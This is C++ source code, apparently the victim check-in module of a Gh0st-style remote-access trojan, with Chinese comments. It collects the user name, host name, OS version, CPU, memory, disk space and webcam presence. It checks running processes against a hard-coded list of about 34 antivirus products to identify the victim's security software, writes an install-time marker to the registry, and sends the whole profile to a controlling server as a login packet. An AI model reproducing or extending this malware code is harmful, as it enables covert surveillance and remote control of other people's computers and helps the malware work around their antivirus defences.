
#include <wininet.h>
#include <stdlib.h>
#include <vfw.h>
//#include "decode.h"
#include "../../PublicInclude/until.h"
/*************判断视频的头文件*******************/
#include <strmif.h>
#include <uuids.h>
#pragma comment(lib, "strmiids.lib")
/**********************************/

#pragma comment(lib, "wininet.lib")
#pragma comment(lib, "vfw32.lib")


#define GB(x) ((x.HighPart << 2) + ((DWORD)x.LowPart) / 1024.0 / 1024.0 / 1024.0)



//枚举视频设备
//////////////////////////////////////////////////////////
UINT EnumDevices()
{
	UINT nCam = 0;
	CoInitialize(NULL);    //COM 库初始化
	/////////////////////    Step1        /////////////////////////////////
	//枚举捕获设备
	ICreateDevEnum* pCreateDevEnum;                          //创建设备枚举器
	//创建设备枚举管理器
	HRESULT hr = CoCreateInstance(CLSID_SystemDeviceEnum,    //要创建的Filter的Class ID
		NULL,                                                //表示Filter不被聚合
		CLSCTX_INPROC_SERVER,                                //创建进程内COM对象
		IID_ICreateDevEnum,                                  //获得的接口ID
		(void**)&pCreateDevEnum);                            //创建的接口对象的指针
	if (hr != NOERROR)
	{
		//	d(_T("CoCreateInstance Error"));
		return FALSE;
	}
	/////////////////////    Step2        /////////////////////////////////
	IEnumMoniker* pEm;                 //枚举监控器接口
	//获取视频类的枚举器
	hr = pCreateDevEnum->CreateClassEnumerator(CLSID_VideoInputDeviceCategory, &pEm, 0);
	//如果想获取音频类的枚举器，则使用如下代码
	//hr=pCreateDevEnum->CreateClassEnumerator(CLSID_AudioInputDeviceCategory, &pEm, 0);
	if (hr != NOERROR)
	{
		//d(_T("hr != NOERROR"));
		return FALSE;
	}
	/////////////////////    Step3        /////////////////////////////////
	pEm->Reset();                                            //类型枚举器复位
	ULONG cFetched;
	IMoniker* pM;                                            //监控器接口指针
	while (hr = pEm->Next(1, &pM, &cFetched), hr == S_OK)       //获取下一个设备
	{
		IPropertyBag* pBag;                                  //属性页接口指针
		hr = pM->BindToStorage(0, 0, IID_IPropertyBag, (void**)&pBag);
		//获取设备属性页
		if (SUCCEEDED(hr))
		{
			VARIANT var;
			var.vt = VT_BSTR;                                //保存的是二进制数据
			hr = pBag->Read(L"FriendlyName", &var, NULL);
			//获取FriendlyName形式的信息
			if (hr == NOERROR)
			{
				nCam++;
				SysFreeString(var.bstrVal);   //释放资源，特别要注意
			}
			pBag->Release();                  //释放属性页接口指针
		}
		pM->Release();                        //释放监控器接口指针
	}
	CoUninitialize();                   //卸载COM库
	return nCam;
}

bool IsWebCam()
{
	bool	bRet = false;

	if (EnumDevices() > 0)
	{
		bRet = TRUE;
	}
	return bRet;
}

UINT GetHostRemark(LPCTSTR lpServiceName, LPTSTR lpBuffer, UINT uSize)
{
	char	strSubKey[1024];
	memset(lpBuffer, 0, uSize);
	memset(strSubKey, 0, sizeof(strSubKey));
	wsprintf(strSubKey, "SYSTEM\\CurrentControlSet\\Services\\%s", lpServiceName);
	ReadRegEx(HKEY_LOCAL_MACHINE, strSubKey, "Host", REG_SZ, (char *)lpBuffer, NULL, uSize, 0);

	if (lstrlen(lpBuffer) == 0)
		gethostname(lpBuffer, uSize);

	return lstrlen(lpBuffer);
}

typedef struct
{
	char* Course;
	char* Name;
}AYSDFE;

AYSDFE g_AntiVirus_Data[40] =
{
	{"360tray.exe",       "360安全卫士"},
	{"360sd.exe",         "360杀毒"},
	{"kxetray.exe",       "金山毒霸"},
	{"KSafeTray.exe",     "金山安全卫士"},
	{"QQPCRTP.exe",       "QQ电脑管家"},
	{"HipsTray.exe",      "火绒"},
	{"BaiduSd.exe",       "百度杀毒"},
	{"baiduSafeTray.exe", "百度卫士"},
	{"KvMonXP.exe",       "江民"},
	{"RavMonD.exe",       "瑞星"},
	{"QUHLPSVC.EXE",      "QuickHeal"},   //印度
	{"mssecess.exe",      "微软MSE"},
	{"cfp.exe",           "Comodo杀毒"},
	{"SPIDer.exe",        "DR.WEB"},      //大蜘蛛
	{"acs.exe",           "Outpost"},
	{"V3Svc.exe",         "安博士V3"},
	{"AYAgent.aye",       "韩国胶囊"},
	{"avgwdsvc.exe",      "AVG"},
	{"f-secure.exe",      "F-Secure"},    //芬安全
	{"avp.exe",           "卡巴"},
	{"Mcshield.exe",      "麦咖啡"},
	{"egui.exe",          "NOD32"},
	{"knsdtray.exe",      "可牛"},
	{"TMBMSRV.exe",       "趋势"},
	{"avcenter.exe",      "小红伞"},
	{"ashDisp.exe",       "Avast网络安全"},
	{"rtvscan.exe",       "诺顿"},
	{"remupd.exe",        "熊猫卫士"},
	{"vsserv.exe",        "BitDefender"}, //BD  bdagent.exe
	{"PSafeSysTray.exe",  "PSafe反病毒"}, //巴西
	{"ad-watch.exe",      "Ad-watch反间谍"},
	{"K7TSecurity.exe",   "K7杀毒"},
	{"UnThreat.exe",      "UnThreat"},    //保加利亚
	{"nissrv.exe",      "windows defender"},    //微软
	{"  ",                "  "}
};

//查找杀毒
char* ssdd()
{
	static char AllName[1024];
	int t = 0;
	memset(AllName, 0, sizeof(AllName));
	while (1)
	{
		if (strstr(g_AntiVirus_Data[t].Course, " ") == 0)
		{
			if (GetProcessID(g_AntiVirus_Data[t].Course))
			{
				lstrcat(AllName, g_AntiVirus_Data[t].Name);
				lstrcat(AllName, " ");
			}
		}
		else
			break;
		t++;
	}

	if (strstr(AllName, " ") == 0)
	{
		lstrcat(AllName, "暂未发现");
	}
	return AllName;
}

// Get System Information
DWORD CPUClockMhz()
{
	HKEY	hKey;
	DWORD	dwCPUMhz;
	DWORD	dwBytes = sizeof(DWORD);
	DWORD	dwType = REG_DWORD;
	RegOpenKey(HKEY_LOCAL_MACHINE, "HARDWARE\\DESCRIPTION\\System\\CentralProcessor\\0", &hKey);
	RegQueryValueEx(hKey, "~MHz", NULL, &dwType, (PBYTE)&dwCPUMhz, &dwBytes);
	RegCloseKey(hKey);
	return	dwCPUMhz;
}

//获取硬盘
DWORD GetHd()
{
	DWORD num = 0;     //总和
	char hd[MAX_PATH] = { 0 };
	char* pan = hd;

	if (GetLogicalDriveStringsA(MAX_PATH, hd) > 0)
	{
		while (*pan)
		{
			ULARGE_INTEGER lpTotalNumberOfFreeBytes = { 0 };
			GetDiskFreeSpaceExA(pan, NULL, &lpTotalNumberOfFreeBytes, NULL);
			DWORD g = GB(lpTotalNumberOfFreeBytes);
			num += g;
			pan = pan + strlen(pan) + 1;
		}
	}
	return num;
}

//获取系统版本
void GetOsVer(char* os,DWORD len)
{
	HKEY	hKey;
	DWORD	dwBytes = len;
	DWORD	dwType = REG_SZ;
	RegOpenKey(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", &hKey);
	RegQueryValueEx(hKey, "ProductName", NULL, &dwType, (LPBYTE)os, &dwBytes);
	RegCloseKey(hKey);
}



//发送上线信息
int sendLoginInfo(CClientSocket* pClient, DWORD dwSpeed, MODIFY_DATA modify_data)
{
	int nRet = SOCKET_ERROR;
	
	// 登录信息
	LOGININFO	LoginInfo = {0};
	// 开始构造数据
	LoginInfo.bToken = TOKEN_LOGIN; // 令牌为登录
	LoginInfo.bIsWebCam = 0; //没有摄像头

	//获取用户名
	DWORD  dwSize = sizeof(LoginInfo.UserName);
	GetUserName(LoginInfo.UserName, &dwSize);

	//获取系统版本
	GetOsVer(LoginInfo.Os, sizeof(LoginInfo.Os));

	// 连接的IP地址
	sockaddr_in  sockAddr;
	memset(&sockAddr, 0, sizeof(sockAddr));
	int nSockAddrLen = sizeof(sockAddr);
	getsockname(pClient->m_Socket, (SOCKADDR*)&sockAddr, &nSockAddrLen);
	memcpy(&LoginInfo.nIPAddress, (void*)&sockAddr.sin_addr, sizeof(IN_ADDR));

	//主机名
	char a[MAX_PATH] = { 0 };
	gethostname(LoginInfo.HostName, 50);

	//获取硬盘大小
	LoginInfo.HD = GetHd();

	//内存大小
	MEMORYSTATUS    MemInfo;
	MemInfo.dwLength = sizeof(MemInfo);
	GlobalMemoryStatus(&MemInfo);
	LoginInfo.MemSize = MemInfo.dwTotalPhys / 1024 / 1024;

	//获取CPU频率
	LoginInfo.CPUClockMhz = CPUClockMhz();

	SYSTEM_INFO siSysInfo;
	GetSystemInfo(&siSysInfo);
	LoginInfo.CPUNumber = siSysInfo.dwNumberOfProcessors;

	//查找摄像头
	LoginInfo.bIsWebCam = IsWebCam();

	// 判断杀毒
	strcpy(LoginInfo.Virus, ssdd());

	// 连接服务器到返回的时间
	LoginInfo.dwSpeed = dwSpeed;

	// 获取备注信息 // 获取安装时间

	SYSTEMTIME sys = { 0 };
	GetLocalTime(&sys);
	char Time[0x30] = { 0 };
	wsprintf(Time, "%d-%d-%d-%d:%d", sys.wYear, sys.wMonth, sys.wDay, sys.wHour, sys.wMinute);

	DWORD len = sizeof(LoginInfo.Remark);
	HKEY   hKey;
	if (RegCreateKeyA(HKEY_CURRENT_USER, "SOFTWARE\\Microsoft", &hKey) == 0)
	{
		RegGetValueA(hKey, NULL, "Mark", RRF_RT_REG_SZ, 0, LoginInfo.Remark, &len);
		len = sizeof(LoginInfo.InstallTime);
		if (RegGetValueA(hKey, NULL, "Time", RRF_RT_REG_SZ, 0, LoginInfo.InstallTime, &len) != 0)
		{
			RegSetValueExA(hKey, "Time", 0, REG_SZ, (LPBYTE)Time, strlen(Time) + 1);
			RtlCopyMemory(LoginInfo.InstallTime, Time, 0x30);
		}
		RegCloseKey(hKey);
	}
	else
	{
		
		RtlCopyMemory(LoginInfo.Remark, "error", strlen("error") + 1);
		RtlCopyMemory(LoginInfo.InstallTime, Time, 0x30);
	}
	
	nRet = pClient->Send((LPBYTE)&LoginInfo, sizeof(LOGININFO));
	
	return nRet;
}
